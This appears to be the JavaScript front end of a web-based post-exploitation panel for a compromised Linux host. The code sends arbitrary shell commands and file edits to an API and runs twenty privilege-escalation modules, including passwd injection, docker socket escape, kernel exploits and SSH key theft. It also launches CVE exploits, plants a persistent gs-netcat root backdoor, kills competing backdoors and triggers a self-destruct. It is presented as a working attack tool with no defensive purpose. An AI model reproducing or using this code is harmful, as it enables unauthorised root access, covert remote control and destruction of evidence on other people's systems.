const $=id=>document.getElementById(id);
const api=async(e,d)=>{try{const r=await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})});return r.json();}catch(x){return{error:x.message}}};

document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));

let cwd='/',currentFile='',sysData={},methodResults={},sessionRemaining=7200;

function nav(p){
    document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));
    document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));
    $('p-'+p)?.classList.add('on');
    document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');
    if(p==='exp')loadExp();
    if(p==='proc')loadProc();
    if(p==='gs')gsScan();
    if(p==='files')fmLoad(cwd);
}

function openModal(id){$(id).classList.add('on');}
function closeModal(id){$(id).classList.remove('on');}

// Session Timer
async function updateSessionTimer(){
    const r=await api('timer');
    if(r.remaining!==undefined){
        sessionRemaining=r.remaining;
    }
}

function renderTimer(){
    const mins=Math.floor(sessionRemaining/60);
    const secs=sessionRemaining%60;
    const timerEl=$('session-timer');
    if(timerEl){
        timerEl.textContent=`${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
        timerEl.className='session-timer'+(sessionRemaining<300?' danger':sessionRemaining<900?' warning':'');
    }
    if(sessionRemaining>0)sessionRemaining--;
    if(sessionRemaining<=0){
        document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:#ef4444;font-size:20px;flex-direction:column"><div style="font-size:48px;margin-bottom:20px">⏱</div>SESSION EXPIRED<br><small style="color:#666;margin-top:10px">Memory cleared</small></div>';
    }
}

// Initialize
async function init(){
    // Get session timer
    await updateSessionTimer();
    setInterval(renderTimer,1000);
    setInterval(updateSessionTimer,60000);
    
    const r=await api('run',{path:'scripts/sysinfo.sh'});
    try{
        const d=JSON.parse(r.output||'{}');
        sysData=d;
        $('s_user').textContent=d.user||'-';
        $('s_uid').textContent='uid:'+(d.uid||'?');
        $('s_kernel').textContent=(d.kernel||'-').split('-')[0];
        $('s_up').textContent=d.uptime||'-';
        $('s_mem').textContent=d.mem||'-';
        $('th').textContent=d.hostname||'target';
        document.title='DZ • '+(d.hostname||'target');
        $('cfg-info').textContent=JSON.stringify(d,null,2);
    }catch(e){}
    fmLoad('/');
    startLive();
    checkGsAlert();
    initMethodCards();
}

function startLive(){
    async function u(){
        const r=await api('exec',{cmd:"cat /proc/loadavg 2>/dev/null|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}';df / 2>/dev/null|tail -1|awk '{gsub(/%/,\"\");print $5}'"});
        const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');
        $('live-stats').innerHTML=`
            <div style="margin-bottom:8px">
                <div style="display:flex;justify-content:space-between;font-size:10px"><span>CPU</span><span>${load}</span></div>
            </div>
            <div style="margin-bottom:8px">
                <div style="display:flex;justify-content:space-between;font-size:10px"><span>MEM</span><span>${mem}%</span></div>
                <div class="stat-bar"><i style="width:${mem}%;background:${mem>80?'var(--red)':'var(--green)'}"></i></div>
            </div>
            <div>
                <div style="display:flex;justify-content:space-between;font-size:10px"><span>DISK</span><span>${disk}%</span></div>
                <div class="stat-bar"><i style="width:${disk}%;background:${disk>80?'var(--red)':'var(--green)'}"></i></div>
            </div>`;
    }
    u();setInterval(u,5000);
}

async function checkGsAlert(){
    const r=await api('run',{path:'scripts/gscan.sh'});
    try{
        const d=JSON.parse(r.output||'{}');
        const gs=(d.gsockets||[]).filter(g=>g.type==='process');
        if(gs.length){
            $('dash-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${gs.length} GSockets Detected!</strong><a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View →</a></div></div>`;
        }
    }catch(e){}
}

// LPE Methods
const LPE_METHODS = [
    {id:'01_sudo',name:'Sudo NOPASSWD',desc:'Check sudo misconfigurations'},
    {id:'02_suid',name:'SUID Binaries',desc:'Find exploitable SUID files'},
    {id:'03_passwd',name:'Writable /etc/passwd',desc:'Direct user injection'},
    {id:'04_docker',name:'Docker Socket',desc:'Container escape via docker.sock'},
    {id:'05_capabilities',name:'Capabilities',desc:'Linux capabilities abuse'},
    {id:'06_kernel',name:'Kernel Exploit',desc:'DirtyPipe, DirtyCOW, PwnKit'},
    {id:'07_cron',name:'Cron Jobs',desc:'Writable cron entries'},
    {id:'08_ldpreload',name:'LD_PRELOAD',desc:'Sudo env_keep exploitation'},
    {id:'09_redis',name:'Redis',desc:'Redis misconfig RCE'},
    {id:'10_passwords',name:'Password Reuse',desc:'Hunt credentials in files'},
    {id:'11_nfs',name:'NFS no_root_squash',desc:'NFS root escalation'},
    {id:'12_path',name:'Writable PATH',desc:'PATH hijacking'},
    {id:'13_dbus',name:'D-Bus',desc:'D-Bus policy exploitation'},
    {id:'14_lxd',name:'LXD/LXC',desc:'Container privilege escape'},
    {id:'15_systemd',name:'Systemd',desc:'Service manipulation'},
    {id:'16_sshkeys',name:'SSH Keys',desc:'Key theft and injection'},
    {id:'17_mysql',name:'MySQL UDF',desc:'User-defined function RCE'},
    {id:'18_tmux',name:'Tmux/Screen',desc:'Session hijacking'},
    {id:'19_pspy',name:'Process Monitor',desc:'Background process discovery'},
    {id:'20_final',name:'Final Checks',desc:'World-writable, SGID, misc'}
];

function initMethodCards(){
    let h='';
    LPE_METHODS.forEach((m,i)=>{
        h+=`
        <div class="method-card" id="mc-${i}">
            <div class="method-header" onclick="toggleMethod(${i})">
                <span class="method-num">${String(i+1).padStart(2,'0')}</span>
                <span class="method-name">${m.name}<br><small style="color:var(--dim);font-size:10px">${m.desc}</small></span>
                <span class="method-status pending" id="mstat-${i}">pending</span>
                <span class="method-toggle">▼</span>
            </div>
            <div class="method-body">
                <div class="method-output" id="mout-${i}">Click "Run" to execute this check</div>
                <div class="method-actions">
                    <button class="btn btn-sm" onclick="runSingleMethod(${i})">▶ Run</button>
                    <button class="btn btn-sm btn-ghost" onclick="clearMethod(${i})">Clear</button>
                </div>
            </div>
        </div>`;
    });
    $('method-list').innerHTML=h;
}

function toggleMethod(idx){
    const card=$('mc-'+idx);
    card.classList.toggle('expanded');
}

function clearMethod(idx){
    $('mout-'+idx).textContent='Click "Run" to execute this check';
    $('mstat-'+idx).textContent='pending';
    $('mstat-'+idx).className='method-status pending';
}

async function runSingleMethod(idx){
    const m=LPE_METHODS[idx];
    const card=$('mc-'+idx);
    const stat=$('mstat-'+idx);
    const out=$('mout-'+idx);
    
    card.classList.add('expanded');
    stat.textContent='checking';
    stat.className='method-status checking';
    out.innerHTML='<span style="color:var(--gold)">Running '+m.name+'...</span>';
    
    const r=await api('run',{path:'lpe_methods/'+m.id+'.sh'});
    const output=r.output||'No output';
    
    // Format output with colors
    let formatted=output.split('\n').map(line=>{
        if(line.includes('[+]'))return `<span style="color:var(--green)">${line}</span>`;
        if(line.includes('[-]'))return `<span style="color:var(--red)">${line}</span>`;
        if(line.includes('[!]'))return `<span style="color:#f59e0b">${line}</span>`;
        if(line.includes('[*]'))return `<span style="color:var(--gold)">${line}</span>`;
        return line;
    }).join('\n');
    
    out.innerHTML=`<pre style="margin:0;white-space:pre-wrap">${formatted}</pre>`;
    methodResults[idx]=output;
    
    // Determine status
    if(output.includes('[+]')||output.includes('SUCCESS')||output.includes('VULNERABLE')||output.includes('ROOT_SECRET')){
        stat.textContent='success';
        stat.className='method-status success';
    }else if(output.includes('[!]')||output.includes('found')||output.includes('READABLE')||output.includes('WRITABLE')){
        stat.textContent='partial';
        stat.className='method-status partial';
    }else{
        stat.textContent='clean';
        stat.className='method-status failed';
    }
    
    // Check for root secret
    if(output.includes('ROOT_SECRET:')){
        const match=output.match(/ROOT_SECRET:([^\s\n]+)/);
        if(match){
            $('root-success').style.display='flex';
            $('root-success-msg').textContent='Method: '+m.name;
            $('root-result').innerHTML=`
                <div class="root-box">
                    <h3>🎉 ROOT BACKDOOR PLANTED!</h3>
                    <p style="font-size:11px;color:var(--text)">Stealth GSSocket backdoor installed as root.</p>
                    <code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${match[1]} -i</code>
                </div>`;
        }
    }
}

async function runAllMethods(){
    $('btn-autoroot').disabled=true;
    $('btn-autoroot').textContent='Running...';
    $('root-success').style.display='none';
    $('root-result').innerHTML='';
    
    for(let i=0;i<LPE_METHODS.length;i++){
        await runSingleMethod(i);
        await new Promise(r=>setTimeout(r,300));
    }
    
    $('btn-autoroot').disabled=false;
    $('btn-autoroot').textContent='🚀 Run All';
    
    // Summary
    let success=0,partial=0;
    for(let i=0;i<20;i++){
        const stat=$('mstat-'+i)?.textContent;
        if(stat==='success')success++;
        if(stat==='partial')partial++;
    }
    
    if(success===0&&partial===0){
        $('root-result').innerHTML=`<div class="alert"><span class="alert-icon">✓</span><div class="alert-text"><strong>System appears hardened</strong>No obvious privilege escalation vectors found.</div></div>`;
    }else if(success===0){
        $('root-result').innerHTML=`<div class="alert" style="background:rgba(245,158,11,0.1);border-color:rgba(245,158,11,0.2)"><span class="alert-icon">⚠️</span><div class="alert-text"><strong>${partial} Potential Vectors</strong>Review partial findings for manual exploitation.</div></div>`;
    }
}

// Exploits
async function loadExp(){
    $('exp-list').innerHTML='Loading...';
    const r=await api('run',{path:'exploits/gate.sh'});
    try{
        const d=JSON.parse(r.output||'{}');
        let h='';
        (d.exploits||[]).forEach(x=>{
            const c=x.rate>=80?'var(--green)':'var(--gold)';
            h+=`<div class="method-card">
                <div class="method-header" onclick="runExp('${x.cve}')">
                    <span style="color:var(--gold);font-family:'JetBrains Mono';font-size:12px">${x.cve}</span>
                    <span class="method-name">${x.name}</span>
                    <span style="color:${c};font-size:12px">${x.rate}%</span>
                </div>
            </div>`;
        });
        $('exp-list').innerHTML=h||'No exploits';
    }catch(e){$('exp-list').innerHTML='Error';}
}

async function runExp(cve){
    if(!confirm('Run '+cve+'?'))return;
    const r=await api('run',{path:'exploits/'+cve+'/run.sh'});
    alert(r.output||'Done');
}

// Terminal
async function rs(path){
    $('term-out').innerHTML='';
    addLine('term-out','$ bash '+path,'cmd');
    const r=await api('run',{path});
    (r.output||'').split('\n').forEach(l=>addLine('term-out',l,'ok'));
}

function addLine(el,t,c){
    const d=document.createElement('div');
    d.className='ln '+(c||'');
    d.textContent=t;
    $(el).appendChild(d);
    $(el).scrollTop=1e9;
}

async function termExec(){
    const c=$('term-cmd').value.trim();
    if(!c)return;
    $('term-cmd').value='';
    addLine('term-out','$ '+c,'cmd');
    const r=await api('exec',{cmd:c});
    (r.output||'').split('\n').forEach(l=>addLine('term-out',l,''));
}

async function loadProc(){
    $('proc-out').innerHTML='';
    addLine('proc-out','$ ps aux --sort=-%mem','cmd');
    const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -40'});
    (r.output||'').split('\n').forEach(l=>addLine('proc-out',l,''));
}

// File Manager
async function fmLoad(path){
    cwd=path;
    const parts=path.split('/').filter(Boolean);
    let breadcrumb='<a href="#" onclick="fmLoad(\'/\');return false">~</a>';
    parts.forEach((p,i)=>{
        const fp='/'+parts.slice(0,i+1).join('/');
        breadcrumb+=` / <a href="#" onclick="fmLoad('${fp}');return false">${p}</a>`;
    });
    $('fm-path').innerHTML=breadcrumb;
    
    const r=await api('files',{path});
    let h='';
    
    if(path!=='/'){
        const pr=path.split('/').slice(0,-1).join('/')||'/';
        h+=`<div class="fm-item" ondblclick="fmLoad('${pr}')"><div class="fm-icon dir">⬆</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;
    }
    
    const files=(r.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name));
    const icons={sh:'⚡',py:'🐍',js:'📜',c:'©',txt:'📝',conf:'⚙',gz:'📦',tar:'📦'};
    
    files.forEach(f=>{
        const fp=path==='/'?'/'+f.name:path+'/'+f.name;
        const isDir=f.type==='dir';
        const ext=f.name.split('.').pop().toLowerCase();
        h+=`<div class="fm-item" ondblclick="${isDir?`fmLoad('${fp}')`:`fmView('${fp}')`}" oncontextmenu="fmCtx(event,'${fp}')">
            <div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div>
            <div class="fm-info">
                <div class="fm-name">${f.name}</div>
                <div class="fm-meta">${f.perm||''} • ${f.size||''}</div>
            </div>
        </div>`;
    });
    $('fm-list').innerHTML=h||'Empty';
}

function fmUp(){fmLoad(cwd.split('/').slice(0,-1).join('/')||'/');}
function fmRefresh(){fmLoad(cwd);}
async function fmView(path){currentFile=path;$('modal-view-title').textContent=path.split('/').pop();const r=await api('read',{path});$('modal-view-content').textContent=r.content||'(empty/binary)';openModal('modal-view');}
async function fmEdit(path){currentFile=path||currentFile;$('modal-edit-title').textContent='Edit: '+currentFile.split('/').pop();const r=await api('read',{path:currentFile});$('modal-edit-content').value=r.content||'';closeModal('modal-view');openModal('modal-edit');}
async function fmSaveEdit(){await api('write',{path:currentFile,content:$('modal-edit-content').value});closeModal('modal-edit');fmRefresh();}
function fmNewFile(){$('modal-new-name').value='';$('modal-new-content').value='';openModal('modal-new');}
function fmNewDir(){const n=prompt('Folder name:');if(n)api('mkdir',{path:cwd+'/'+n}).then(fmRefresh);}
async function fmSaveNew(){const n=$('modal-new-name').value.trim();if(!n)return;await api('write',{path:cwd+'/'+n,content:$('modal-new-content').value});closeModal('modal-new');fmRefresh();}
async function fmDelete(path){if(!confirm('Delete?'))return;await api('delete',{path});fmRefresh();}
function fmCtx(e,path){e.preventDefault();const c=prompt('1=View 2=Edit 3=Delete');if(c==='1')fmView(path);else if(c==='2')fmEdit(path);else if(c==='3')fmDelete(path);}

// GSSocket Monitor
async function gsScan(){
    $('gs-list').innerHTML='<div style="padding:20px;text-align:center;color:var(--dim)">Scanning...</div>';
    const r=await api('run',{path:'scripts/gscan.sh'});
    
    try{
        const d=JSON.parse(r.output||'{}');
        const items=d.gsockets||[];
        const procs=items.filter(g=>g.type==='process');
        
        if(procs.length){
            $('gs-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${procs.length} Active GSockets!</strong></div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All</button></div>`;
        }else{
            $('gs-alert').innerHTML=`<div class="alert success"><span class="alert-icon">✓</span><div class="alert-text"><strong>Clean</strong> No active GSockets detected</div></div>`;
        }
        
        let h='';
        items.forEach(g=>{
            if(g.type==='process'){
                h+=`<div class="gs-card hostile">
                    <div class="gs-header">
                        <span class="gs-badge hostile">PROCESS</span>
                        <span class="gs-secret">${g.secret||'hidden'}</span>
                        <button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button>
                    </div>
                    <div class="gs-body">
                        <table>
                            <tr><td>PID</td><td>${g.pid}</td></tr>
                            <tr><td>User</td><td>${g.user}</td></tr>
                            <tr><td>Mode</td><td>${g.mode}</td></tr>
                        </table>
                    </div>
                </div>`;
            }else{
                h+=`<div class="gs-card hostile">
                    <div class="gs-header">
                        <span class="gs-badge hostile">${(g.type||'').toUpperCase()}</span>
                        <span class="gs-secret">${g.path||''}</span>
                    </div>
                    <div class="gs-body"><table><tr><td>Owner</td><td>${g.owner||'-'}</td></tr></table></div>
                </div>`;
            }
        });
        
        $('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No GSockets found</div>';
    }catch(e){
        $('gs-list').innerHTML='<div style="padding:20px;color:var(--red)">Error parsing results</div>';
    }
}

async function gsKill(pid){await api('exec',{cmd:'kill -9 '+pid});setTimeout(gsScan,500);}
async function gsKillAll(){if(!confirm('Kill ALL gs-netcat?'))return;await api('exec',{cmd:"pkill -9 -f gs-netcat"});setTimeout(gsScan,500);}

async function gsPlant(){
    const s=prompt('Secret (empty=random):');
    $('gs-list').innerHTML='<div style="padding:20px;text-align:center;color:var(--gold)">Planting stealth backdoor...</div>';
    
    const r=await api('run',{path:'scripts/gs_implant.sh '+(s||'')});
    
    try{
        const lines=r.output.split('\n');
        const lastJson=lines.filter(l=>l.startsWith('{')).pop();
        const d=JSON.parse(lastJson||'{}');
        
        if(d.status==='success'){
            alert(`✅ STEALTH BACKDOOR PLANTED!\n\nSecret: ${d.secret}\nInstances: ${d.instances}\nPersistence: ${d.persistence||'none'}\n\nConnect:\n${d.connect}\n\nFeatures:\n${(d.features||[]).join(', ')}`);
        }else{
            alert('Error: '+(d.message||r.output));
        }
    }catch(e){
        alert('Result:\n'+r.output);
    }
    gsScan();
}

// Actions
async function pull(){await api('pull');location.reload();}
async function nuke(){if(!confirm('⚠️ DESTRUCT ALL?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}

init();
